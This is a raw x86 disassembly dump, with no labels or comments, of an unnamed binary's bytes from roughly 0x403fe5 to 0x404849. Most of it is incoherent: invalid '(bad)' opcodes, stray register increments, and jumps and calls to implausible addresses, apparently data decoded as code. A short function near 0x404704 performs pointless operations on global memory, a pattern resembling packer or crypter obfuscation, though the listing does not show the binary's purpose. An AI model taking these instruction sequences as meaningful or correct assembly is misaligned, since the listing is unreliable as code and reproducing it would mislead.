  403fe5:	inc    edi
  403fe7:	inc    ebp
  403fe8:	enter  0x918b,0xfc
  403fec:	inc    ebp
  403fed:	(bad)  
  403fee:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3961]
  403ff5:	mov    DWORD PTR [esi-0x4],ebx
  403ff8:	rol    DWORD PTR [ebp-0x37],0x8b
  403ffc:	add    al,0xf4
  403ffe:	push   ebp
  403fff:	into   
  404000:	in     al,dx
  404001:	mov    BYTE PTR [ebp-0x3f],0x8b
  404005:	dec    ebp
  404006:	or     BYTE PTR [ebx],bh
  404008:	xor    BYTE PTR [esi+0x1],0x8b
  40400c:	add    ah,ah
  40400e:	add    dh,al
  404010:	in     al,dx
  404011:	(bad)  
  404012:	push   ebx
  404013:	inc    ebp
  404014:	mov    eax,edi
  404016:	adc    al,ch
  404018:	push   ss
  404019:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40401f:	popa   
  404020:	iret   
  404021:	dec    ebp
  404022:	lahf   
  404023:	mov    esi,DWORD PTR [edx]
  404025:	clc    
  404026:	add    ecx,esi
  404028:	cmp    ecx,edi
  40402a:	jne    0x404014
  40402c:	add    DWORD PTR [ebp-0x6f],0x4f08648b
  404033:	or     BYTE PTR [ebx+0x48ae94d],bl
  404039:	or     eax,DWORD PTR [eax]
  40403b:	push   ebp
  40403c:	dec    ebp
  40403d:	jnp    0xd00a4d0c
  404043:	dec    ebp
  404044:	xlat   BYTE PTR ds:[ebx]
  404045:	mov    ecx,ebx
  404047:	call   0x340a961f
  40404c:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  404053:	(bad)  
  404054:	cld    
  404055:	sti    
  404056:	lahf   
  404057:	(bad)  
  404058:	mov    ebp,0x8b330055
  40405d:	mov    DWORD PTR [eax],ecx
  40405f:	clc    
  404060:	iret   
  404061:	dec    ebp
  404062:	retf   
  404063:	xor    eax,ecx
  404065:	lea    eax,[eax+ecx*1+0x7204]
  40406c:	dec    ebp
  40406d:	inc    ebp
  40406e:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  404074:	mov    esp,DWORD PTR [ecx+0x14]
  404077:	int    0x6
  404079:	sub    eax,DWORD PTR [ebp+0x3]
  40407c:	(bad)  
  40407d:	lock or BYTE PTR [ebp-0x7b],cl
  404081:	mov    edi,eax
  404083:	in     al,dx
  404084:	cmp    ecx,DWORD PTR [ebp-0x64]
  404087:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40408d:	jne    0x404018
  40408f:	mov    ebx,DWORD PTR [eax]
  404091:	in     al,0x45
  404093:	dec    ebp
  404094:	mov    esi,DWORD PTR [ebx]
  404096:	nop
  404097:	add    eax,DWORD PTR [eax]
  404099:	pop    edi
  40409a:	mov    esi,DWORD PTR [ebx]
  40409c:	mov    DWORD PTR [ebx-0x2c],ebx
  40409f:	ret    0x4d
  4040a2:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  4040a8:	mov    ecx,DWORD PTR [ebp+0x3]
  4040ab:	mov    edi,DWORD PTR [eax+edx*4]
  4040ae:	dec    ebp
  4040af:	add    BYTE PTR [ebx-0x387cf775],cl
  4040b5:	jo     0x40407a
  4040b7:	push   esi
  4040b8:	inc    ebp
  4040b9:	jne    0x404046
  4040bb:	mov    ecx,DWORD PTR [eax]
  4040bd:	push   edi
  4040be:	(bad)  
  4040bf:	pop    ecx
  4040c0:	ret    
  4040c1:	push   ecx
  4040c2:	inc    ebp
  4040c3:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  4040c9:	add    BYTE PTR [ebx+0x45d10ccb],al
  4040cf:	jnp    0x406d4d02
  4040d5:	jg     0x404062
  4040d7:	jmp    0x54:0xde85700c
  4040de:	inc    ebp
  4040df:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  4040e3:	push   ebp
  4040e4:	cmp    BYTE PTR [ebx],dh
  4040e6:	dec    ebp
  4040e7:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  4040ed:	cmp    esp,DWORD PTR [ebx]
  4040ef:	jne    0x40407c
  4040f1:	or     DWORD PTR [ecx+edx*4],0xee036440
  4040f8:	jmp    0x40410f
  4040fa:	mov    ebp,ecx
  4040fc:	push   esp
  4040fd:	add    al,0x45
  4040ff:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  404105:	add    eax,ebx
  404107:	cmp    eax,DWORD PTR [ebp+0xf]
  40410a:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  404111:	sbb    BYTE PTR [ebp+0x45],al
  404114:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40411a:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  404120:	mov    DWORD PTR [ebp+0x14],eax
  404123:	cmp    BYTE PTR [ebp-0x64],al
  404126:	cmp    bh,BYTE PTR [edx-0x7387a64]
  40412c:	adc    al,0x55
  40412e:	test   DWORD PTR [ebx+0x454518f8],ecx
  404134:	cmp    al,0x8b
  404136:	pushf  
  404137:	sbb    BYTE PTR [ebx+0x4d01f080],cl
  40413d:	add    BYTE PTR [ebx],dh
  40413f:	add    BYTE PTR [ebx],al
  404141:	dec    ebp
  404142:	jnp    0x898d5a09
  404148:	mov    eax,DWORD PTR [ecx]
  40414a:	rol    BYTE PTR [eax],1
  40414c:	iret   
  40414d:	or     DWORD PTR [eax+ecx*2+0xc32899f],ecx
  404154:	cmp    eax,DWORD PTR [ebp+0xf]
  404157:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40415e:	or     BYTE PTR [ebp-0x39],al
  404161:	xor    eax,ebx
  404163:	add    eax,DWORD PTR [ebp-0x77]
  404166:	mov    edx,DWORD PTR [eax+ebx*1]
  404169:	inc    ebp
  40416a:	inc    ebp
  40416b:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  404171:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  404177:	mov    ebp,eax
  404179:	cmp    cl,dh
  40417b:	dec    ebp
  40417c:	dec    DWORD PTR [eax+0x45]
  40417f:	inc    ecx
  404180:	(bad)  
  404181:	mov    esp,eax
  404183:	or     al,0x85
  404185:	sbb    al,bh
  404187:	inc    eax
  404188:	inc    ebp
  404189:	mov    esi,DWORD PTR [ebx]
  40418b:	or     al,0x3
  40418d:	dec    ecx
  40418e:	push   eax
  40418f:	dec    eax
  404190:	inc    ebp
  404191:	rcl    BYTE PTR [eax-0x38],1
  404194:	push   eax
  404195:	inc    ebp
  404196:	dec    DWORD PTR [ebx-0x3e07c775]
  40419c:	rol    BYTE PTR [ebx],0x4e
  40419f:	inc    eax
  4041a0:	inc    ebp
  4041a1:	mov    DWORD PTR [ebx],esi
  4041a3:	sbb    BYTE PTR [ebx],al
  4041a5:	inc    ebp
  4041a6:	push   eax
  4041a7:	xor    esi,DWORD PTR [ebp+0x3]
  4041aa:	lea    ecx,[ecx+0x45e814b8]
  4041b0:	cmc    
  4041b1:	xor    edi,edi
  4041b3:	add    eax,DWORD PTR [ebp-0x77]
  4041b6:	mov    DWORD PTR [eax+eiz*8],edx
  4041b9:	inc    ebp
  4041ba:	inc    ebp
  4041bb:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  4041c1:	ret    
  4041c2:	inc    ebp
  4041c3:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  4041c9:	adc    al,0x8b
  4041cb:	test   DWORD PTR [eax],edx
  4041cd:	clc    
  4041ce:	inc    ecx
  4041cf:	inc    ebp
  4041d0:	mov    edi,DWORD PTR ds:0xc7c89ce0
  4041d6:	push   ss
  4041d7:	adc    al,0x45
  4041d9:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4041df:	mov    eax,DWORD PTR [ebx]
  4041e1:	sbb    BYTE PTR [eax],cl
  4041e3:	(bad)  
  4041e4:	dec    ebp
  4041e5:	ret    
  4041e6:	sub    ebp,DWORD PTR [edi+0x8028be9]
  4041ec:	add    BYTE PTR [ebp+0xc],dl
  4041ef:	xor    esi,DWORD PTR [ebp-0x73]
  4041f2:	lea    edx,[ecx]
  4041f4:	lods   al,BYTE PTR ds:[esi]
  4041f5:	jb     0x4041df
  4041f7:	add    ch,dh
  4041f9:	sar    edi,0x83
  4041fc:	cmp    BYTE PTR [ebx],al
  4041fe:	pushf  
  4041ff:	add    BYTE PTR [ecx+0x4533cc45],cl
  404205:	add    edi,DWORD PTR [ebx]
  404207:	mov    DWORD PTR [esp+edx*1+0x3c445c7],ebx
  40420e:	test   esp,ebx
  404210:	clc    
  404211:	inc    ebp
  404212:	inc    ebp
  404213:	(bad)  
  404214:	cmp    eax,0x8d759cf4
  404219:	mov    ecx,esp
  40421b:	or     al,0x4d
  40421d:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  404223:	clc    
  404224:	lea    eax,[ebp-0x3c]
  404227:	xor    BYTE PTR [ebp-0x64],cl
  40422a:	lea    ecx,[ebx-0x38b21f40]
  404230:	mov    eax,ebx
  404232:	or     BYTE PTR [ebp-0x17344731],cl
  404238:	dec    ebp
  404239:	imul   ecx
  40423b:	inc    DWORD PTR [ecx]
  40423d:	inc    ebp
  40423e:	add    BYTE PTR [ebp-0x74638bc6],al
  404244:	pavgb  mm7,mm6
  404247:	mov    DWORD PTR [eax],0xf0ff8bc3
  40424d:	clc    
  40424e:	iret   
  40424f:	inc    ebp
  404250:	lock push eax
  404252:	retf   
  404253:	fmul   QWORD PTR [ebp-0x1]
  404256:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40425c:	test   BYTE PTR [ebx+0x4d32e09f],cl
  404262:	mov    DWORD PTR [ebx],ebp
  404264:	loopne 0x4041ef
  404266:	inc    ebp
  404267:	loopne 0x4041f4
  404269:	inc    ebp
  40426a:	loopne 0x4041f7
  40426c:	xbegin 0x4088335
  404272:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  404279:	jb     0x4042cb
  40427b:	mov    ecx,DWORD PTR [eax+edi*8]
  40427e:	inc    ebp
  40427f:	inc    eax
  404280:	push   eax
  404281:	mov    ebx,DWORD PTR [edi-0x8]
  404284:	inc    DWORD PTR [ecx-0x75]
  404287:	mov    ebp,esp
  404289:	loopne 0x40428b
  40428b:	rol    edi,0xee
  40428e:	test   BYTE PTR [eax],al
  404290:	dec    ebx
  404291:	push   0x32
  404293:	dec    DWORD PTR [ebx-0x30baf70c]
  404299:	push   eax
  40429a:	mov    dh,0x94
  40429c:	add    edi,edi
  40429e:	cmp    edi,DWORD PTR [eax-0x7877af1]
  4042a4:	add    BYTE PTR [ebp-0x75],al
  4042a7:	(bad)  
  4042a8:	call   0xc7c54375
  4042ad:	clc    
  4042ae:	test   BYTE PTR [ebp+0x4b],al
  4042b1:	cmp    dh,BYTE PTR [edx]
  4042b3:	pushf  
  4042b4:	mov    eax,edi
  4042b6:	or     al,al
  4042b8:	iret   
  4042b9:	test   DWORD PTR [esi+0x3b4d03f8],esi
  4042bf:	mov    DWORD PTR [edi],ecx
  4042c1:	in     al,dx
  4042c2:	pop    eax
  4042c3:	dec    ebp
  4042c4:	add    BYTE PTR [ecx+0x4df8e88b],cl
  4042ca:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  4042d0:	dec    ebx
  4042d1:	mov    DWORD PTR [edx],esi
  4042d3:	in     al,0x8b
  4042d5:	dec    ebp
  4042d6:	or     BYTE PTR [ebx],dh
  4042d8:	iret   
  4042d9:	add    esi,DWORD PTR [esi+0x3be00389]
  4042df:	test   DWORD PTR [edi],0x3d3800
  4042e5:	test   DWORD PTR [ebx+0x84e4f8],ecx
  4042eb:	add    edi,eax
  4042ed:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  4042f4:	mov    eax,DWORD PTR [ebx]
  4042f6:	or     BYTE PTR [ecx+0x45b614cf],cl
  4042fc:	add    esi,DWORD PTR [ebx]
  4042fe:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  404304:	add    BYTE PTR [eax],al
  404306:	mov    eax,DWORD PTR [ebp-0x18]
  404309:	mov    eax,DWORD PTR [eax]
  40430b:	lock (bad) 
  40430d:	dec    ebp
  40430e:	test   BYTE PTR [ebx],dh
  404310:	dec    ebx
  404311:	add    esi,DWORD PTR [edx]
  404313:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  404319:	or     bh,cl
  40431b:	(bad)  
  40431c:	mov    ebx,es
  40431e:	dec    ebx
  40431f:	push   0x32
  404321:	lea    esi,[edx]
  404323:	lods   al,BYTE PTR ds:[esi]
  404324:	mov    ebp,eax
  404326:	clc    
  404327:	cli    
  404328:	or     edi,edi
  40432a:	iret   
  40432b:	inc    ebp
  40432c:	mov    WORD PTR [ebx-0x75cdccb5],cs
  404332:	or     al,BYTE PTR ds:0xec728b
  404338:	or     DWORD PTR [ebp-0x31],ecx
  40433b:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  404342:	cmp    al,cl
  404344:	je     0x40451e
  40434a:	mov    eax,DWORD PTR [ebp-0x8]
  40434d:	mov    eax,DWORD PTR [eax]
  40434f:	xor    eax,edi
  404351:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  404358:	mov    ecx,DWORD PTR [ebp-0x18]
  40435b:	xor    ecx,DWORD PTR [ecx]
  40435d:	bswap  edi
  40435f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  404367:	add    DWORD PTR [ebx+0x945e400],ecx
  40436d:	mov    ecx,edi
  40436f:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  404376:	or     al,BYTE PTR [eax]
  404378:	mov    ecx,DWORD PTR [ebp-0x18]
  40437b:	xor    ecx,DWORD PTR [ecx]
  40437d:	bswap  edi
  40437f:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  404387:	add    DWORD PTR [edi],ecx
  404389:	add    BYTE PTR [eax-0x7474ffbb],dl
  40438f:	xor    esp,esp
  404391:	mov    al,BYTE PTR [eax]
  404393:	add    eax,0x8472c7
  404398:	dec    ebx
  404399:	dec    ebp
  40439a:	xor    dh,BYTE PTR [ebx]
  40439c:	mov    ecx,DWORD PTR [edi]
  40439e:	clc    
  40439f:	ror    BYTE PTR [ecx],0xcb
  4043a2:	iret   
  4043a3:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  4043ab:	inc    ebp
  4043ac:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  4043b2:	iret   
  4043b3:	add    eax,0x4b728c
  4043b8:	xor    cl,BYTE PTR [ebp+0xa]
  4043bb:	mov    ecx,DWORD PTR [ebx+0x98af833]
  4043c1:	or     eax,0x8c72cf
  4043c6:	dec    edi
  4043c7:	shl    DWORD PTR [edx],0x4d
  4043ca:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  4043d0:	in     al,0xd
  4043d2:	add    BYTE PTR [edx-0x39],dh
  4043d5:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4043dc:	mov    esi,DWORD PTR [ebx]
  4043de:	in     al,dx
  4043df:	mov    cl,BYTE PTR [ecx]
  4043e1:	or     eax,0x8c72cf
  4043e6:	dec    ebx
  4043e7:	enter  0x8532,0x32
  4043eb:	add    BYTE PTR [ebx+0x945e800],cl
  4043f1:	mov    ecx,edi
  4043f3:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  4043fa:	or     al,BYTE PTR [eax]
  4043fc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4043ff:	mov    ecx,DWORD PTR [ecx]
  404401:	xor    ecx,edi
  404403:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  40440a:	cmp    al,cl
  40440c:	jne    0x40445b
  40440e:	lea    ecx,[ebx-0x7517cc54]
  404414:	cli    
  404415:	or     eax,0x4d72ff
  40441a:	cmp    eax,ecx
  40441c:	je     0x40446b
  40441e:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  404424:	ret    
  404425:	or     eax,0x8b7245
  40442a:	lock enter 0x85c7,0x84
  40442f:	add    BYTE PTR [edi+0x33453200],bl
  404435:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40443b:	add    eax,0x37233
  404440:	cmp    ecx,DWORD PTR [ebp+0xf]
  404443:	mov    esi,edi
  404445:	xor    edi,edi
  404447:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40444d:	add    BYTE PTR [ebx],dh
  40444f:	rol    DWORD PTR [ebx],0x4d
  404452:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  404458:	lock or eax,0x33724d
  40445e:	(bad)  
  40445f:	ror    DWORD PTR [eax],0x4d
  404462:	jb     0x4043ef
  404464:	add    BYTE PTR [ebx],dh
  404466:	ja     0x4043f2
  404468:	sbb    BYTE PTR ds:0x8d7275,cl
  40446e:	xchg   esp,eax
  40446f:	enter  0x50e8,0xf3
  404473:	inc    ebp
  404474:	dec    DWORD PTR [ebx-0x7574ccbb]
  40447a:	loopne 0x404481
  40447c:	(bad)  
  40447d:	jb     0x404442
  40447f:	add    cl,al
  404481:	dec    ebp
  404482:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  404488:	add    ecx,DWORD PTR ds:0x187250
  40448e:	inc    ebp
  40448f:	rcl    DWORD PTR [eax+0x4d],0x4f
  404493:	mov    edi,edi
  404495:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40449b:	jb     0x404426
  40449d:	add    BYTE PTR [ecx+eax*8],dl
  4044a0:	jne    0x4044ef
  4044a2:	dec    DWORD PTR [ebx-0x75baccec]
  4044a8:	add    ecx,DWORD PTR ds:0xe872d8
  4044ae:	repnz enter 0x10ff,0x45
  4044b3:	inc    ebp
  4044b4:	mov    edx,DWORD PTR [eax-0x20]
  4044b7:	mov    ds:0x8bc3ffc7,eax
  4044bc:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  4044c4:	mov    esi,DWORD PTR [ebx]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	add    eax,DWORD PTR [ebp-0x77]
  4044ca:	push   eax
  4044cb:	adc    al,0x15
  4044cd:	inc    ebp
  4044ce:	push   DWORD PTR [ebx]
  4044d0:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  4044d6:	add    DWORD PTR [eax],eax
  4044d8:	mov    eax,edi
  4044da:	test   al,0x4d
  4044dc:	inc    ebp
  4044dd:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  4044e3:	retf   
  4044e4:	mov    edx,ecx
  4044e6:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  4044ed:	inc    ebp
  4044ee:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  4044f4:	xor    eax,ebx
  4044f6:	(bad)  
  4044f7:	enter  0x1111,0x72
  4044fb:	inc    ebp
  4044fc:	add    BYTE PTR [ebx-0x387de73f],cl
  404502:	cld    
  404503:	test   bh,bh
  404505:	lahf   
  404506:	jne    0x40453a
  404508:	mov    ebp,ebx
  40450a:	fsubr  DWORD PTR [edx+0x6]
  40450d:	dec    DWORD PTR [edx]
  40450f:	hlt    
  404510:	xor    eax,0x7f502d45
  404515:	sbb    ch,ah
  404517:	call   DWORD PTR [edx-0x75]
  40451a:	pop    esi
  40451b:	or     cl,cl
  40451d:	dec    ebp
  40451e:	adc    al,0x33
  404520:	push   ebp
  404521:	add    ebp,esp
  404523:	cmp    esp,esp
  404525:	je     0x4044aa
  404527:	mov    esp,DWORD PTR [eax]
  404529:	or     BYTE PTR [eax],bh
  40452b:	(bad)  
  40452c:	pushf  
  40452d:	ret    
  40452e:	mov    DWORD PTR [edx+0x24],ebp
  404531:	lea    ecx,[ebp+0x44e80394]
  404537:	clc    
  404538:	or     al,0xff
  40453a:	push   esp
  40453b:	inc    ebp
  40453c:	or     BYTE PTR [ebx+0x450818be],al
  404542:	pop    es
  404543:	call   esi
  404545:	test   al,0xbf
  404547:	jne    0x4045bb
  404549:	mov    eax,DWORD PTR [eax]
  40454b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40454c:	xlat   BYTE PTR ds:[ebx]
  40454d:	inc    ebp
  40454e:	push   esp
  40454f:	push   eax
  404550:	or     al,0xde
  404552:	push   ebp
  404553:	dec    DWORD PTR [ecx-0x74f7db75]
  404559:	dec    ebp
  40455a:	adc    BYTE PTR [ebx],dh
  40455c:	rol    DWORD PTR [ebx],1
  40455e:	sbb    BYTE PTR [ebx],bh
  404560:	dec    esp
  404561:	je     0x404577
  404563:	push   0x54
  404565:	call   DWORD PTR [eax]
  404567:	test   al,0xce
  404569:	inc    ebp
  40456a:	iret   
  40456b:	add    ebp,DWORD PTR [edi+0x24e889d8]
  404571:	clc    
  404572:	jmp    0x854776
  404577:	mov    edx,eax
  404579:	test   al,0x1f
  40457b:	or     BYTE PTR [ebp+eax*2+0x10],al
  40457f:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  404583:	inc    ebp
  404584:	(bad)  
  404585:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9f]
  40458c:	mov    DWORD PTR [ebx],eax
  40458e:	and    al,0xf
  404590:	push   0xf84d85c1
  404595:	mov    edi,ebp
  404597:	rol    BYTE PTR [eax],1
  404599:	iret   
  40459a:	or     DWORD PTR [edx+edi*1+0x75329c9f],0x850f683b
  4045a5:	push   edi
  4045a6:	clc    
  4045a7:	(bad)  
  4045a8:	jmp    0x404535
  4045aa:	add    BYTE PTR [eax],dl
  4045ac:	mov    eax,0xf8898545
  4045b1:	jmp    0x404583
  4045b3:	add    DWORD PTR [ebp+0x640091],0x206544be
  4045bd:	pop    edi
  4045be:	inc    esp
  4045bf:	pop    ebx
  4045c0:	sbb    dl,al
  4045c2:	inc    ebp
  4045c3:	add    BYTE PTR [ecx-0x747cdb75],cl
  4045c9:	clc    
  4045ca:	and    al,0xec
  4045cc:	mov    DWORD PTR [ecx-0x7747adc],edi
  4045d2:	and    al,0x4c
  4045d4:	mov    DWORD PTR [eax],ecx
  4045d6:	and    al,0x41
  4045d8:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  4045de:	and    al,0x24
  4045e0:	xor    edx,DWORD PTR [esi+0x3]
  4045e3:	pop    ecx
  4045e4:	mov    DWORD PTR [ecx-0x75],edx
  4045e7:	xor    esp,DWORD PTR [edi+edx*2]
  4045ea:	mov    ebx,DWORD PTR [edi+0x3003294]
  4045f0:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  4045f6:	mov    ecx,DWORD PTR [esp+edx*4]
  4045f9:	push   esp
  4045fa:	add    BYTE PTR [eax],ah
  4045fc:	mov    edx,DWORD PTR [ebp+0x3]
  4045ff:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  404606:	mov    DWORD PTR [ebx+0x33002401],ecx
  40460c:	dec    ecx
  40460d:	add    ebp,DWORD PTR [edx+0xf]
  404610:	push   0x4c30ca
  404615:	adc    BYTE PTR [eax+0x1f],dh
  404618:	push   0x0
  40461a:	(bad)  
  40461b:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  404621:	and    al,0x24
  404623:	mov    esi,DWORD PTR [ebx]
  404625:	and    al,0x3
  404627:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40462d:	jb     0x404653
  40462f:	add    bh,bh
  404631:	inc    esp
  404632:	and    al,0x14
  404634:	lea    edi,[edx]
  404636:	and    al,0x9c
  404638:	push   eax
  404639:	jmp    0x544682
  40463e:	(bad)  
  40463f:	cli    
  404640:	and    al,0x85
  404642:	(bad)  
  404643:	clc    
  404644:	and    al,0xa
  404646:	call   0xffdd3f88
  40464b:	jmp    0x544694
  404650:	dec    esp
  404651:	ds or  al,0x9c
  404654:	(bad)  
  404655:	cmp    eax,edi
  404657:	bswap  eax
  404659:	mov    bh,0x4b
  40465b:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40465f:	and    al,0x4c
  404661:	mov    DWORD PTR [esp],ebx
  404664:	(bad)  
  404665:	mov    eax,edi
  404667:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40466d:	inc    esp
  40466e:	jmp    0x404684
  404670:	add    DWORD PTR [ebp+edi*1+0x20],0x1075449c
  404678:	push   0xf8148544
  40467d:	inc    esp
  40467e:	sbb    BYTE PTR [edx+edi*8],dl
  404681:	dec    esp
  404682:	test   DWORD PTR [eax+edi*8],ebx
  404685:	mov    BYTE PTR [edi],0xc7
  404688:	aas    
  404689:	add    DWORD PTR [esp+eax*2-0x7f7ee715],ebx
  404690:	aas    
  404691:	add    DWORD PTR [eax+eax*1+0x44500875],ebx
  404698:	jne    0x4046b2
  40469a:	inc    DWORD PTR [eax+0xfa01f8]
  4046a0:	clc    
  4046a1:	add    bh,bh
  4046a3:	inc    ecx
  4046a4:	jne    0x404631
  4046a6:	call   0xffcc44cf
  4046ab:	fadd   DWORD PTR [eax+eax*1+0xc]
  4046af:	mov    eax,DWORD PTR [esp+edx*1+0xc]
  4046b3:	add    al,0x5e
  4046b5:	add    ch,ah
  4046b7:	add    dl,al
  4046b9:	inc    DWORD PTR [eax]
  4046bb:	push   eax
  4046bc:	and    al,0x0
  4046be:	rol    DWORD PTR ss:[ebp-0x63f3f8bc],1
  4046c5:	inc    esp
  4046c6:	adc    DWORD PTR [esp+ebx*4],0x9c768c6
  4046cd:	inc    esp
  4046ce:	adc    BYTE PTR [eax+ecx*1],ah
  4046d1:	inc    esp
  4046d2:	call   FWORD PTR [esp]
  4046d5:	je     0x4046fb
  4046d7:	sbb    BYTE PTR [ebx-0x74d7f3bc],cl
  4046dd:	lea    ecx,[ebx+0x3b503324]
  4046e3:	je     0x404670
  4046e5:	sub    al,0x8b
  4046e7:	je     0x40471c
  4046e9:	and    al,0xf
  4046eb:	mov    bl,0x1
  4046ed:	(bad)  
  4046ee:	clc    
  4046ef:	and    al,0xeb
  4046f1:	and    al,0x75
  4046f3:	add    eax,DWORD PTR [ebp-0x74db818c]
  4046f9:	and    al,0x5d
  4046fb:	add    eax,DWORD PTR [edx+edi*8+0x3c]
  4046ff:	cmp    al,0x85
  404701:	or     al,0x89
  404703:	pop    edi
  404704:	push   ebp
  404705:	mov    ebp,esp
  404707:	sub    esp,0x78
  40470a:	xor    eax,DWORD PTR ds:0x412370
  404710:	mov    eax,ds:0x40d5d0
  404715:	mov    DWORD PTR [ebp-0x10],eax
  404718:	mov    eax,ds:0x40d6dc
  40471d:	or     DWORD PTR ds:0x417e59,0x49bb
  404727:	mov    DWORD PTR [ebp-0x30],eax
  40472a:	mov    DWORD PTR [ebp-0xc],0xf89c8538
  404731:	mov    eax,ds:0x412368
  404736:	and    DWORD PTR ds:0x41abde,eax
  40473c:	mov    DWORD PTR [ebp-0x14],0xf89c853b
  404743:	mov    eax,DWORD PTR [ebp-0xc]
  404746:	xor    DWORD PTR ds:0x4245be,0x412378
  404750:	push   ebx
  404751:	push   esi
  404752:	and    DWORD PTR ds:0x417e55,0x7bf9
  40475c:	push   edi
  40475d:	mov    esi,0x7510859
  404762:	xor    eax,esi
  404764:	add    DWORD PTR ds:0x4245c6,0x4e22
  40476e:	mov    edi,0x32729f
  404773:	or     DWORD PTR ds:0x4245c6,0x5629
  40477d:	add    eax,edi
  40477f:	mov    DWORD PTR [ebp-0x20],eax
  404782:	movzx  eax,WORD PTR ds:0x412370
  404789:	and    DWORD PTR ds:0x415111,eax
  40478f:	mov    DWORD PTR [ebp-0x28],0xf89cb538
  404796:	dec    eax
  404797:	mov    DWORD PTR [ebp-0x34],0xf89f0538
  40479e:	mov    DWORD PTR [ebp-0x2c],0xf89c85f8
  4047a5:	add    DWORD PTR ds:0x41abd2,edx
  4047ab:	jmp    0x404924
  4047b0:	xlat   BYTE PTR ds:[ebx]
  4047b1:	mov    dl,0x2
  4047b3:	and    edi,DWORD PTR [ebx-0x5fa5289d]
  4047b9:	mov    al,ds:0xaee687ea
  4047be:	fst    st(7)
  4047c0:	jle    0x404840
  4047c2:	jle    0x404842
  4047c4:	fidivr DWORD PTR [edi+0x7e]
  4047c7:	jle    0x404797
  4047c9:	(bad)  
  4047ca:	cmp    eax,0xcfdb31c5
  4047cf:	fld    st(2)
  4047d1:	ja     0x404847
  4047d3:	or     eax,DWORD PTR [ebx]
  4047d5:	xchg   edi,eax
  4047d6:	or     BYTE PTR [edi],cl
  4047d8:	cmp    ecx,DWORD PTR [edi]
  4047da:	enter  0x3710,0x18
  4047de:	pop    ds
  4047df:	mov    cl,0x50
  4047e1:	or     BYTE PTR [edi-0x4210f123],ah
  4047e7:	rol    esi,cl
  4047e9:	or     ecx,DWORD PTR [esi-0x551b41ea]
  4047ef:	dec    ecx
  4047f0:	add    eax,0x1fb6dead
  4047f5:	push   esi
  4047f6:	in     al,dx
  4047f7:	outs   dx,DWORD PTR ds:[esi]
  4047f8:	add    ebx,DWORD PTR [ecx]
  4047fa:	pushf  
  4047fb:	jo     0x4047c3
  4047fd:	dec    eax
  4047fe:	mov    ds:0x34d92d5b,al
  404803:	cmp    al,0xad
  404805:	xor    BYTE PTR [ebx+0x35],0xa3
  404809:	jbe    0x40483f
  40480b:	fisttp DWORD PTR [ecx+0x3198c6f1]
  404811:	jecxz  0x40484b
  404813:	and    ecx,0x4f
  404816:	(bad)  
  404817:	xchg   esi,eax
  404818:	dec    ecx
  404819:	inc    DWORD PTR [edi-0x2d5e8870]
  40481f:	mov    ebp,0x4526ed4d
  404824:	sub    edi,DWORD PTR [edx-0x4361911e]
  40482a:	jae    0x404845
  40482c:	retf   
  40482d:	call   0xd4ca:0x5ee3c429
  404834:	mov    al,0xf8
  404836:	loop   0x4047d2
  404838:	cmp    edi,ecx
  40483a:	fs push ebp
  40483c:	(bad)  
  40483d:	sub    ch,cl
  40483f:	or     dl,cl
  404841:	sbb    DWORD PTR [ecx-0x6a],ebx
  404844:	and    eax,0x70696f0b
  404849:	add    BYTE PTR [ecx],bh
